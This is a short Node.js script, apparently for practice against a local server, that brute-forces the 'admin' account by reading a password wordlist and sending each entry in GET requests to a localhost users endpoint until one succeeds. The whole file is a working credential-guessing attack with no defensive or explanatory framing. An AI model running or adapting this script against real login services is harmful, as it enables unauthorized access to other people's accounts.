const axios = require("axios");
const bf = require("bruteforce");
const fs = require("fs");

const passwords = fs.readFileSync("passwords.txt", "utf8").split("\n");

async function tryPasswords() {
  for (let password of passwords) {
    try {
      await axios({
        method: "get",
        url: "http://localhost:4000/users",
        params: {
          login: "admin",
          password: password.trim(),
        },
      });

      console.log("Password found: " + password);
      process.exit(0);
    } catch (error) {
      console.log("Password not found: " + password);
      console.log(error);
    }
  }
}

tryPasswords();
